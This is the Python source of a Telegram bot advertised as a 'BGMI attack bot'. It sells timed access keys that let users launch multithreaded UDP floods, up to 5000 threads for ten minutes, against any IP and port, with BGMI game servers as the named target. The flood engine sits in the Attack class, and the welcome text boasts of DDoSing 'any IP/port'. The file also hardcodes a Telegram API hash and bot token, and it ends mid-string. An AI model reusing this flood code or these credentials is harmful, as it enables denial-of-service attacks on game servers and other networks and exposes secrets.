#!/usr/bin/env python3
"""
💎 PREMIUM BGMI ATTACK BOT - ULTRA PRO
Server Freeze Bot | Random Emoji + Sticker + Video | Auto Update | Welcome Animation
"""

import asyncio, json, random, os, time, socket, threading, logging, string, uuid
from datetime import datetime, timedelta
import pytz
from pyrogram import Client, filters
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import FloodWait

# ═══════════════ LOGGING ═══════════════
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# ═══════════════ CONFIG ═══════════════
API_ID = 35140329
API_HASH = "011f638e4acadee178c59afffc80193d"
BOT_TOKEN = "8771905727:AAEJq2QVVSe8OxZOqLkatVK1wGysO9UyzCQ"
OWNER_ID = 1987818347
OWNER_USERNAME = "FathersOfCreater"
OWNER_LINK = f"https://t.me/{OWNER_USERNAME}"
BOT_USERNAME = "BeStChEaT_BGMIDdos_Bot"
BOT_LINK = f"https://t.me/{BOT_USERNAME}"

# ═══════════════ DATABASE ═══════════════
VIDEO_DB = "videos.json"
USERS_DB = "users.json"
KEYS_DB = "keys.json"
BLOCKED_DB = "blocked.json"
HISTORY_DB = "history.json"
STICKER_DB = "sticker.json"
EMOJI_DB = "emojis.json"
STICKER_TIME_DB = "sticker_times.json"
SETTINGS_DB = "settings.json"

IST = pytz.timezone('Asia/Kolkata')
LINE = "━━━━━━━━━━━━━━━━━━━"

# ═══════════════ SETTINGS ═══════════════
PREMIUM_THREADS = 5000
PREMIUM_TIME = 600
DEFAULT_STICKER_TIME = 6
DEFAULT_VIDEO_DELAY = 4

# ═══════════════ TRACKING ═══════════════
used_videos = []
last_emoji_index = -1
last_sticker_index = -1
last_video_index = -1

# ═══════════════ HELPERS ═══════════════
def jload(f, d=None):
    try:
        if os.path.exists(f):
            with open(f) as fl: return json.load(fl)
    except: pass
    return d if d is not None else {}

def jsave(f, d):
    with open(f, 'w') as fl: json.dump(d, fl, indent=2)

def generate_unique_key():
    prefixes = ["BGMI", "VIP", "PRO", "ELITE", "LEGEND", "MYTHIC", "ULTRA"]
    prefix = random.choice(prefixes)
    seg1 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    seg2 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    unique_id = str(uuid.uuid4())[:8].upper()
    return f"{prefix}-{seg1}-{seg2}-{unique_id}"

def parse_duration(time_str):
    if not time_str: return None
    time_str = time_str.lower().strip()
    try:
        if 'min' in time_str: return int(time_str.replace('min','').replace('mins','').strip()), 'minutes'
        elif time_str.endswith('m'): return int(time_str[:-1]), 'minutes'
        elif 'h' in time_str: return int(time_str.replace('h','').replace('hr','').replace('hrs','').replace('hour','').replace('hours','').strip()), 'hours'
        elif 'd' in time_str: return int(time_str.replace('d','').replace('day','').replace('days','').strip()), 'days'
        elif 'w' in time_str: return int(time_str.replace('w','').replace('wk','').replace('wks','').replace('week','').replace('weeks','').strip()), 'weeks'
        elif 'mo' in time_str: return int(time_str.replace('mo','').replace('month','').replace('months','').strip()), 'months'
        else: return int(time_str), 'hours'
    except: return None

def calc_expiry(value, unit):
    now = datetime.now(IST)
    if unit == 'minutes': return now + timedelta(minutes=value)
    elif unit == 'hours': return now + timedelta(hours=value)
    elif unit == 'days': return now + timedelta(days=value)
    elif unit == 'weeks': return now + timedelta(weeks=value)
    elif unit == 'months': return now + timedelta(days=value*30)
    return now + timedelta(hours=value)

def format_duration(value, unit):
    names = {'minutes':'Minute','hours':'Hour','days':'Day','weeks':'Week','months':'Month'}
    name = names.get(unit, unit)
    return f"{value} {name}{'s' if value != 1 else ''}"

def get_remaining(expiry_str):
    try:
        expiry = datetime.fromisoformat(expiry_str)
        now = datetime.now(IST)
        if now >= expiry: return "EXPIRED", True
        diff = expiry - now
        days = diff.days
        hours = diff.seconds // 3600
        minutes = (diff.seconds % 3600) // 60
        if days > 30: return f"{days//30}M+", False
        elif days > 0: return f"{days}D {hours}H", False
        elif hours > 0: return f"{hours}H {minutes}M", False
        else: return f"{minutes}M", False
    except: return "ERROR", False

# ═══════════════ SETTINGS FUNCTIONS ═══════════════
def get_settings():
    return jload(SETTINGS_DB, {"sticker_time": DEFAULT_STICKER_TIME, "video_delay": DEFAULT_VIDEO_DELAY})

def save_settings(sticker_time=None, video_delay=None):
    settings = get_settings()
    if sticker_time is not None:
        settings["sticker_time"] = sticker_time
    if video_delay is not None:
        settings["video_delay"] = video_delay
    jsave(SETTINGS_DB, settings)
    return settings

def get_sticker_display_time():
    settings = get_settings()
    return settings.get("sticker_time", DEFAULT_STICKER_TIME)

def get_video_delay_time():
    settings = get_settings()
    return settings.get("video_delay", DEFAULT_VIDEO_DELAY)

# ═══════════════ STICKER TIME FUNCTIONS ═══════════════
def get_sticker_times():
    return jload(STICKER_TIME_DB, {})

def save_sticker_time(sticker_id, duration):
    data = get_sticker_times()
    data[sticker_id] = duration
    jsave(STICKER_TIME_DB, data)
    return True

def get_sticker_time(sticker_id):
    data = get_sticker_times()
    return data.get(sticker_id, get_sticker_display_time())

def set_all_sticker_times(duration):
    stickers = get_all_stickers()
    if not stickers:
        return False, 0
    data = get_sticker_times()
    for sticker_id in stickers:
        data[sticker_id] = duration
    jsave(STICKER_TIME_DB, data)
    return True, len(stickers)

# ═══════════════ EMOJI FUNCTIONS ═══════════════
def get_emojis():
    data = jload(EMOJI_DB, {"emojis": []})
    return data

def add_emoji(emoji_id):
    data = get_emojis()
    if emoji_id not in data["emojis"]:
        data["emojis"].append(emoji_id)
        jsave(EMOJI_DB, data)
        return True, len(data["emojis"])
    return False, len(data["emojis"])

def remove_emoji(index):
    data = get_emojis()
    if 0 <= index < len(data["emojis"]):
        removed = data["emojis"].pop(index)
        jsave(EMOJI_DB, data)
        return True, removed, len(data["emojis"])
    return False, None, len(data["emojis"])

def get_random_emoji():
    global last_emoji_index
    data = get_emojis()
    if data["emojis"]:
        if len(data["emojis"]) > 1:
            available = [i for i in range(len(data["emojis"])) if i != last_emoji_index]
            if available:
                last_emoji_index = random.choice(available)
                return data["emojis"][last_emoji_index]
        last_emoji_index = 0
        return data["emojis"][0]
    return None

def get_all_emojis():
    return get_emojis()["emojis"]

def reset_emojis():
    jsave(EMOJI_DB, {"emojis": []})
    return True

# ═══════════════ STICKER FUNCTIONS ═══════════════
def get_stickers():
    data = jload(STICKER_DB, {"stickers": []})
    return data

def add_sticker(sticker_id, duration=None):
    data = get_stickers()
    if sticker_id not in data["stickers"]:
        data["stickers"].append(sticker_id)
        jsave(STICKER_DB, data)
        if duration:
            save_sticker_time(sticker_id, duration)
        return True, len(data["stickers"])
    return False, len(data["stickers"])

def remove_sticker(index):
    data = get_stickers()
    if 0 <= index < len(data["stickers"]):
        removed = data["stickers"].pop(index)
        jsave(STICKER_DB, data)
        return True, removed, len(data["stickers"])
    return False, None, len(data["stickers"])

def get_random_sticker():
    global last_sticker_index
    data = get_stickers()
    if data["stickers"]:
        if len(data["stickers"]) > 1:
            available = [i for i in range(len(data["stickers"])) if i != last_sticker_index]
            if available:
                last_sticker_index = random.choice(available)
                return data["stickers"][last_sticker_index]
        last_sticker_index = 0
        return data["stickers"][0]
    return None

def get_all_stickers():
    return get_stickers()["stickers"]

def reset_stickers():
    jsave(STICKER_DB, {"stickers": []})
    jsave(STICKER_TIME_DB, {})
    return True

# ═══════════════ VIDEO FUNCTIONS ═══════════════
def get_vids(): return jload(VIDEO_DB, [])
def add_vid(path):
    vids = get_vids()
    vid = len(vids) + 1
    vids.append({"id": vid, "path": path, "name": os.path.basename(path)})
    jsave(VIDEO_DB, vids)
    return vid

def rand_vid():
    global last_video_index
    vids = get_vids()
    if not vids:
        return None
    if len(vids) > 1:
        available = [v for v in vids if v["id"] != last_video_index]
        if available:
            chosen = random.choice(available)
            last_video_index = chosen["id"]
            return chosen
    chosen = random.choice(vids)
    last_video_index = chosen["id"]
    return chosen

def del_vid(vid):
    vids = get_vids()
    for i, v in enumerate(vids):
        if v["id"] == vid:
            if os.path.exists(v["path"]): os.remove(v["path"])
            vids.pop(i); jsave(VIDEO_DB, vids)
            return True
    return False

def clear_vids():
    vids = get_vids()
    for v in vids:
        if os.path.exists(v["path"]): os.remove(v["path"])
    jsave(VIDEO_DB, [])
    return len(vids)

# ═══════════════ USER FUNCTIONS ═══════════════
def get_users(): return jload(USERS_DB, {"premium": [], "keys": {}})
def get_blocked(): return jload(BLOCKED_DB, [])
def is_blocked(uid): return str(uid) in get_blocked()

def check_access(uid):
    if is_blocked(uid): return False, "BLOCKED"
    if uid == OWNER_ID: return True, "OWNER"
    u = get_users()
    if str(uid) in u.get("premium", []): return True, "PREMIUM"
    uk = u.get("keys", {}).get(str(uid), {})
    if uk:
        try:
            if datetime.now(IST) < datetime.fromisoformat(uk["expiry"]):
                r, _ = get_remaining(uk["expiry"])
                return True, f"KEY ({r})"
            else:
                del u["keys"][str(uid)]; jsave(USERS_DB, u)
        except: pass
    return False, "NONE"

def get_user_info(uid):
    access, a_type = check_access(uid)
    info = {"access": access, "type": a_type, "threads": PREMIUM_THREADS if access else 0, "max_time": PREMIUM_TIME if access else 0, "expiry": None, "remaining": None}
    if a_type.startswith("KEY"):
        uk = get_users().get("keys", {}).get(str(uid), {})
        if uk:
            info["expiry"] = uk.get("expiry")
            if info["expiry"]: info["remaining"], _ = get_remaining(info["expiry"])
    return info

def grant_access(uid, key_name, duration_str, expiry):
    u = get_users()
    if "keys" not in u: u["keys"] = {}
    u["keys"][str(uid)] = {"key_name": key_name, "duration": duration_str, "expiry": expiry.isoformat(), "granted_at": datetime.now(IST).isoformat()}
    jsave(USERS_DB, u)

def remove_expired():
    u = get_users(); removed = 0
    if "keys" in u:
        exp = [uid for uid, data in u["keys"].items() if datetime.now(IST) >= datetime.fromisoformat(data["expiry"])]
        for uid in exp: del u["keys"][uid]; removed += 1
        if removed > 0: jsave(USERS_DB, u)
    return removed

# ═══════════════ HISTORY ═══════════════
def get_history(): return jload(HISTORY_DB, {})
def add_history(uid, action, details):
    h = get_history()
    if str(uid) not in h: h[str(uid)] = []
    h[str(uid)].append({"action": action, "details": details, "time": datetime.now(IST).isoformat()})
    if len(h[str(uid)]) > 50: h[str(uid)] = h[str(uid)][-50:]
    jsave(HISTORY_DB, h)

def get_user_history(uid):
    return get_history().get(str(uid), [])

# ═══════════════ KEY FUNCTIONS ═══════════════
def get_keys(): return jload(KEYS_DB, {})
def create_key(name, time_str):
    keys = get_keys()
    key_code = generate_unique_key()
    while key_code in keys: key_code = generate_unique_key()
    parsed = parse_duration(time_str)
    if not parsed: return None, None
    value, unit = parsed
    keys[key_code] = {"name": name, "time_value": value, "time_unit": unit, "duration_display": format_duration(value, unit), "created": datetime.now(IST).isoformat(), "used_by": None, "active": True}
    jsave(KEYS_DB, keys)
    return key_code, format_duration(value, unit)

def redeem_key_code(key_code, user_id):
    keys = get_keys()
    if key_code not in keys: return False, "Invalid key!"
    key = keys[key_code]
    if not key["active"]: return False, "Key already used!"
    expiry = calc_expiry(key["time_value"], key["time_unit"])
    grant_access(user_id, key["name"], key["duration_display"], expiry)
    key["used_by"] = str(user_id); key["used_at"] = datetime.now(IST).isoformat(); key["active"] = False
    jsave(KEYS_DB, keys)
    add_history(user_id, "KEY_REDEEMED", f"{key['duration_display']}")
    return True, expiry.strftime('%d %B %Y, %I:%M %p')

# ═══════════════ ATTACK ENGINE ═══════════════
class Attack:
    def __init__(self):
        self.on = False; self.pkts = 0; self.bytes_out = 0; self.lock = threading.Lock()
    def flood(self, ip, port, end):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
        s.settimeout(0.001)
        ports = list(range(7000, 15000)) + [17500, 20000, 27000]
        while self.on and time.time() < end:
            try:
                for _ in range(20):
                    if not self.on: break
                    p = random.randbytes(random.randint(500, 1500))
                    s.sendto(p, (ip, random.choice(ports)))
                    with self.lock: self.pkts += 1; self.bytes_out += len(p)
            except: pass
        s.close()
    def start(self, ip, port, dur, threads):
        self.on = True; self.pkts = 0; self.bytes_out = 0
        end = time.time() + dur
        workers = [threading.Thread(target=self.flood, args=(ip, port, end)) for _ in range(threads)]
        for w in workers: w.daemon = True; w.start()
        time.sleep(dur); self.on = False
        e = max(dur, 0.1)
        return {'pkts': self.pkts, 'mbps': (self.bytes_out*8)/(e*1e6), 'mb': self.bytes_out/1024/1024}

attacker = Attack()
attacking = False
ainfo = {}
amsg = None
attack_user = None

# ═══════════════ BOT ═══════════════
app = Client("final_bgmi_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ═══════════════ STYLISH TEXT HELPERS - 5 STYLES ═══════════════
def style1_smallcaps(text):
    chars = {
        'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ғ','g':'ɢ','h':'ʜ','i':'ɪ',
        'j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ',
        's':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ',
        'A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ',
        'J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ',
        'S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def style2_greek(text):
    chars = {
        'a':'α','b':'в','c':'¢','d':'∂','e':'є','f':'f','g':'g','h':'н','i':'ι',
        'j':'נ','k':'κ','l':'ℓ','m':'м','n':'η','o':'σ','p':'ρ','q':'q','r':'я',
        's':'ѕ','t':'т','u':'υ','v':'ν','w':'ω','x':'χ','y':'γ','z':'z',
        'A':'α','B':'в','C':'¢','D':'∂','E':'є','F':'f','G':'g','H':'н','I':'ι',
        'J':'נ','K':'κ','L':'ℓ','M':'м','N':'η','O':'σ','P':'ρ','Q':'q','R':'я',
        'S':'ѕ','T':'т','U':'υ','V':'ν','W':'ω','X':'χ','Y':'γ','Z':'z'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def style3_bolditalic(text):
    chars = {
        'a':'𝒂','b':'𝒃','c':'𝒄','d':'𝒅','e':'𝒆','f':'𝒇','g':'𝒈','h':'𝒉','i':'𝒊',
        'j':'𝒋','k':'𝒌','l':'𝒍','m':'𝒎','n':'𝒏','o':'𝒐','p':'𝒑','q':'𝒒','r':'𝒓',
        's':'𝒔','t':'𝒕','u':'𝒖','v':'𝒗','w':'𝒘','x':'𝒙','y':'𝒚','z':'𝒛',
        'A':'𝑨','B':'𝑩','C':'𝑪','D':'𝑫','E':'𝑬','F':'𝑭','G':'𝑮','H':'𝑯','I':'𝑰',
        'J':'𝑱','K':'𝑲','L':'𝑳','M':'𝑴','N':'𝑵','O':'𝑶','P':'𝑷','Q':'𝑸','R':'𝑹',
        'S':'𝑺','T':'𝑻','U':'𝑼','V':'𝑽','W':'𝑾','X':'𝑿','Y':'𝒀','Z':'𝒁'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def style4_script(text):
    chars = {
        'a':'𝓪','b':'𝓫','c':'𝓬','d':'𝓭','e':'𝓮','f':'𝓯','g':'𝓰','h':'𝓱','i':'𝓲',
        'j':'𝓳','k':'𝓴','l':'𝓵','m':'𝓶','n':'𝓷','o':'𝓸','p':'𝓹','q':'𝓺','r':'𝓻',
        's':'𝓼','t':'𝓽','u':'𝓾','v':'𝓿','w':'𝔀','x':'𝔁','y':'𝔂','z':'𝔃',
        'A':'𝓐','B':'𝓑','C':'𝓒','D':'𝓓','E':'𝓔','F':'𝓕','G':'𝓖','H':'𝓗','I':'𝓘',
        'J':'𝓙','K':'𝓚','L':'𝓛','M':'𝓜','N':'𝓝','O':'𝓞','P':'𝓟','Q':'𝓠','R':'𝓡',
        'S':'𝓢','T':'𝓣','U':'𝓤','V':'𝓥','W':'𝓦','X':'𝓧','Y':'𝓨','Z':'𝓩'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def style5_bold(text):
    chars = {
        'a':'𝐚','b':'𝐛','c':'𝐜','d':'𝐝','e':'𝐞','f':'𝐟','g':'𝐠','h':'𝐡','i':'𝐢',
        'j':'𝐣','k':'𝐤','l':'𝐥','m':'𝐦','n':'𝐧','o':'𝐨','p':'𝐩','q':'𝐪','r':'𝐫',
        's':'𝐬','t':'𝐭','u':'𝐮','v':'𝐯','w':'𝐰','x':'𝐱','y':'𝐲','z':'𝐳',
        'A':'𝐀','B':'𝐁','C':'𝐂','D':'𝐃','E':'𝐄','F':'𝐅','G':'𝐆','H':'𝐇','I':'𝐈',
        'J':'𝐉','K':'𝐊','L':'𝐋','M':'𝐌','N':'𝐍','O':'𝐎','P':'𝐏','Q':'𝐐','R':'𝐑',
        'S':'𝐒','T':'𝐓','U':'𝐔','V':'𝐕','W':'𝐖','X':'𝐗','Y':'𝐘','Z':'𝐙'
    }
    result = ""
    for char in text:
        result += chars.get(char, char)
    return result

def premium_text(text, style_num=1):
    styles = {
        1: style1_smallcaps,
        2: style2_greek,
        3: style3_bolditalic,
        4: style4_script,
        5: style5_bold
    }
    styled = styles.get(style_num, style1_smallcaps)(text)
    return f"˹{styled}˼"

# ═══════════════ MENU + BACK BUTTONS ═══════════════
def menu_back_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⌂ MENU", callback_data="menu"),
         InlineKeyboardButton("◀ BACK", callback_data="back")]
    ])

# ═══════════════ STYLISH PREMIUM BUTTONS ═══════════════
def user_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚔ ATTACK", callback_data="attack_menu"),
         InlineKeyboardButton("⛔ STOP", callback_data="stop_attack")],
        [InlineKeyboardButton("▓ STATUS", callback_data="status_btn"),
         InlineKeyboardButton("ⓘ INFO", callback_data="info_menu")],
        [InlineKeyboardButton("⚿ REDEEM KEY", callback_data="redeem_menu")],
        [InlineKeyboardButton("⌨ COMMANDS", callback_data="commands_menu")]
    ])

def owner_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚔ ATTACK", callback_data="attack_menu"),
         InlineKeyboardButton("⛔ STOP", callback_data="stop_attack")],
        [InlineKeyboardButton("▓ STATUS", callback_data="status_btn"),
         InlineKeyboardButton("ⓘ INFO", callback_data="info_menu")],
        [InlineKeyboardButton("⚿ REDEEM KEY", callback_data="redeem_menu")],
        [InlineKeyboardButton("⌨ COMMANDS", callback_data="commands_menu")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("▶ VIDEO MANAGER", callback_data="video_menu")],
        [InlineKeyboardButton("★ EMOJI MANAGER", callback_data="emoji_menu")],
        [InlineKeyboardButton("❄ STICKER MANAGER", callback_data="sticker_menu")],
        [InlineKeyboardButton("⚜ ADMIN PANEL", callback_data="admin_menu")]
    ])

def auto_key_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⏱ 20 MINUTE", callback_data="ak_20m"),
         InlineKeyboardButton("⏱ 40 MINUTE", callback_data="ak_40m"),
         InlineKeyboardButton("⏱ 60 MINUTE", callback_data="ak_60m")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌚ 1 DAY", callback_data="ak_1d"),
         InlineKeyboardButton("⌚ 3 DAY", callback_data="ak_3d"),
         InlineKeyboardButton("⌚ 7 DAY", callback_data="ak_7d")],
        [InlineKeyboardButton("⌚ 15 DAY", callback_data="ak_15d"),
         InlineKeyboardButton("⌚ 23 DAY", callback_data="ak_23d"),
         InlineKeyboardButton("⌚ 30 DAY", callback_data="ak_30d")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⎚ 1 MONTH", callback_data="ak_1mo"),
         InlineKeyboardButton("⎚ 2 MONTH", callback_data="ak_2mo"),
         InlineKeyboardButton("⎚ 3 MONTH", callback_data="ak_3mo")],
        [InlineKeyboardButton("⌂ MENU", callback_data="menu"),
         InlineKeyboardButton("◀ BACK", callback_data="back_admin")]
    ])

def video_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⎘ ADD VIDEO", callback_data="v_add")],
        [InlineKeyboardButton("⌫ DELETE VIDEO", callback_data="v_del")],
        [InlineKeyboardButton("⎚ CLEAR ALL", callback_data="v_clear")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌘ LIST VIDEOS", callback_data="v_list")],
        [InlineKeyboardButton("❓ HELP", callback_data="v_help")],
        [InlineKeyboardButton("⌂ MENU", callback_data="menu"),
         InlineKeyboardButton("◀ BACK", callback_data="back_admin")]
    ])

def emoji_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⎘ ADD EMOJI", callback_data="e_add")],
        [InlineKeyboardButton("⌫ REMOVE EMOJI", callback_data="e_remove")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌘ LIST EMOJIS", callback_data="e_list")],
        [InlineKeyboardButton("↺ RESET ALL", callback_data="e_reset")],
        [InlineKeyboardButton("⌂ MENU", callback_data="menu"),
         InlineKeyboardButton("◀ BACK", callback_data="back_admin")]
    ])

def sticker_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⎘ ADD STICKER", callback_data="s_add")],
        [InlineKeyboardButton("⌫ REMOVE STICKER", callback_data="s_remove")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌘ LIST STICKERS", callback_data="s_list")],
        [InlineKeyboardButton("↺ RESET ALL", callback_data="s_reset")],
        [InlineKeyboardButton("⌂ MENU", callback_data="menu"),
         InlineKeyboardButton("◀ BACK", callback_data="back_admin")]
    ])

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚿ ADD KEY", callback_data="admin_addkey")],
        [InlineKeyboardButton("⚜ AUTO GEN KEY", callback_data="admin_auto")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌘ ALL KEYS", callback_data="admin_keys")],
        [InlineKeyboardButton("⎙ STATS", callback_data="admin_stats")],
        [InlineKeyboardButton("↺ CLEAR EXPIRED", callback_data="admin_clear")],
        [InlineKeyboardButton("┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅", callback_data="sep")],
        [InlineKeyboardButton("⌂ MENU", callback_data="menu"),
         InlineKeyboardButton("◀ BACK", callback_data="back")]
    ])

# ═══════════════ COMMANDS LIST ═══════════════
def get_commands_list(is_owner=False):
    user_commands = f"""
╔══════════════════════════════════════╗
║         ⌨ {premium_text('COMMANDS LIST', 5)}          ║
╚══════════════════════════════════════╝

╔══════════════════════════════════════╗
║      👤 {premium_text('USER COMMANDS', 4)}            ║
╚══════════════════════════════════════╝

/start - ✨ {premium_text('BOT START KAREIN', 1)}
/attack - ⚔ {premium_text('ATTACK START KAREIN', 2)}  
/stop - ⛔ {premium_text('ATTACK STOP KAREIN', 3)}
/redeem - ⚿ {premium_text('KEY REDEEM KAREIN', 4)}

╔══════════════════════════════════════╗
║      🎯 {premium_text('ATTACK HELP', 2)}              ║
╚══════════════════════════════════════╝

{premium_text('Format:', 5)} /attack IP PORT TIME
{premium_text('Example:', 5)} /attack 1.2.3.4 8080 600
{premium_text('BGMI Ports:', 5)} 7000 - 15000
{premium_text('Max Time:', 5)} 600 {premium_text('Seconds', 1)} (10 {premium_text('Minutes', 1)})

╔══════════════════════════════════════╗
║      🔑 {premium_text('REDEEM HELP', 3)}              ║
╚══════════════════════════════════════╝

{premium_text('Format:', 5)} /redeem KEY_CODE
{premium_text('Example:', 5)} /redeem BGMI-XXXX-XXXX-XXXX

╔══════════════════════════════════════╗
║      ⏱ {premium_text('DURATIONS', 1)}                 ║
╚══════════════════════════════════════╝

{premium_text('30m', 2)} - 30 {premium_text('Minutes', 1)}
{premium_text('1h', 3)} - 1 {premium_text('Hour', 1)}
{premium_text('24h', 4)} - 24 {premium_text('Hours', 1)}
{premium_text('7d', 5)} - 7 {premium_text('Days', 1)}
{premium_text('2w', 1)} - 2 {premium_text('Weeks', 1)}
{premium_text('1mo', 2)} - 1 {premium_text('Month', 1)}
{premium_text('3mo', 3)} - 3 {premium_text('Months', 1)}

"""
    
    owner_commands = f"""
╔══════════════════════════════════════╗
║      ⚜ {premium_text('OWNER COMMANDS', 5)}            ║
╚══════════════════════════════════════╝

🎨 {premium_text('STICKER COMMANDS', 4)}
/addsticker - ⎘ {premium_text('STICKER ADD KAREIN', 1)}
/removesticker - ⌫ {premium_text('STICKER REMOVE KAREIN', 2)}
/liststickers - ⌘ {premium_text('STICKERS DEKHEIN', 3)}
/resetstickers - ↺ {premium_text('STICKERS RESET KAREIN', 4)}
/setstickertime - ⏱ {premium_text('SINGLE STICKER TIME SET', 5)}
/setallstickertime - ⏱ {premium_text('ALL STICKERS TIME SET', 1)}

🎯 {premium_text('EMOJI COMMANDS', 2)}
/addemoji - ⎘ {premium_text('EMOJI ADD KAREIN', 3)}
/removeemoji - ⌫ {premium_text('EMOJI REMOVE KAREIN', 4)}
/listemojis - ⌘ {premium_text('EMOJIS DEKHEIN', 5)}
/resetemojis - ↺ {premium_text('EMOJIS RESET KAREIN', 1)}

🎬 {premium_text('VIDEO COMMANDS', 3)}
/addvideo - ⎘ {premium_text('VIDEO ADD KAREIN', 4)}
/delvideo - ⌫ {premium_text('VIDEO DELETE KAREIN', 5)}
/videos - ⌘ {premium_text('VIDEOS DEKHEIN', 1)}
/clearvideos - ⎚ {premium_text('VIDEOS CLEAR KAREIN', 2)}
/setvideodelay - ⏱ {premium_text('VIDEO DELAY SET KAREIN', 3)}

🔑 {premium_text('KEY COMMANDS', 4)}
/genkey - ⚿ {premium_text('KEY GENERATE KAREIN', 5)}
/admin_keys - ⌘ {premium_text('ALL KEYS DEKHEIN', 1)}
/admin_stats - ⎙ {premium_text('STATISTICS DEKHEIN', 2)}
/admin_clear - ↺ {premium_text('EXPIRED CLEAR KAREIN', 3)}

╔══════════════════════════════════════╗
║      📲 {premium_text('CONTACT', 5)}                   ║
╚══════════════════════════════════════╝

⚜ {premium_text('Owner:', 5)} {premium_text('FATHER OF BOT', 4)}
🤖 {premium_text('Bot:', 5)} @BeStChEaT_BGMIDdos_Bot

"""
    
    if is_owner:
        return user_commands + owner_commands
    return user_commands

# ═══════════════ WELCOME ANIMATION ═══════════════
async def welcome_animation(client, msg):
    try:
        user = msg.from_user
        chat_id = msg.chat.id
        first_name = user.first_name or "User"
        user_id = user.id
        
        sticker_display_time = get_sticker_display_time()
        video_delay_time = get_video_delay_time()
        
        sticker_id = get_random_sticker()
        video_data = rand_vid()
        
        if user_id == OWNER_ID:
            kb = owner_kb()
        else:
            kb = user_kb()
        
        final_text = f"""
ʜᴇʏ, [{first_name}](tg://user?id={user_id}) 
ɪ'ᴍ [˹𝚩𝒈𝒎𝒊 ✘ 𝚫𝛕𝛕𝛂𝛓𝛋𝛆𝛄˹ ♪]({BOT_LINK}),

┏━━━━━━━━━━━━━━━━━⧫
┠ ◆ ɪ ʜᴀᴠᴇ sᴘᴇᴄɪᴀʟ ғᴇᴀᴛᴜʀᴇs
┠ ◆ ᴀʟʟ-ɪɴ-ᴏɴᴇ ʙᴏᴛ
┗━━━━━━━━━━━━━━━━━⧫
┏━━━━━━━━━━━━━━━━━⧫
┠ ◆ ʏᴏᴜ ᴄᴀɴ ғʀᴇᴇᴢᴇ ʙɢᴍɪ ꜱᴇʀᴠᴇʀ
┠ ◆ ʏᴏᴜ ᴄᴀɴ ᴅᴅᴏꜱ ᴀɴʏ ɪᴘ/ᴘᴏʀᴛ
┠ ◆ ʏᴏᴜ ᴄᴀɴ ᴜꜱᴇ 5000+ ᴛʜʀᴇᴀᴅꜱ ꜰᴏʀ ᴍᴀx ᴅᴀᴍᴀɢᴇ
┠ ◆ ɪ ᴄᴀɴ ᴀᴛᴛᴀᴄᴋ ᴜᴘᴛᴏ 𝟷𝟶 ᴍɪɴᴜᴛᴇꜱ
┠ ◆ ꜱᴘᴇᴄɪᴀʟ ᴡᴇʟᴄᴏᴍᴇ
┠ ◆ ᴍᴏʀᴇ ғᴇᴀᴛᴜʀᴇs ᴄʟɪᴄᴋ ᴄᴏᴍᴍᴀɴᴅs ʙᴜᴛᴛᴏɴ
┗━━━━━━━━━━━━━━━━━⧫
๏ ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ʜᴇʟᴩ ʙᴜᴛᴛᴏɴ ᴛᴏ ɢᴇᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴀʙᴏᴜᴛ ᴍʏ ᴍᴏᴅᴜʟᴇs ᴀɴᴅ ᴄᴏᴍᴍᴀɴᴅs

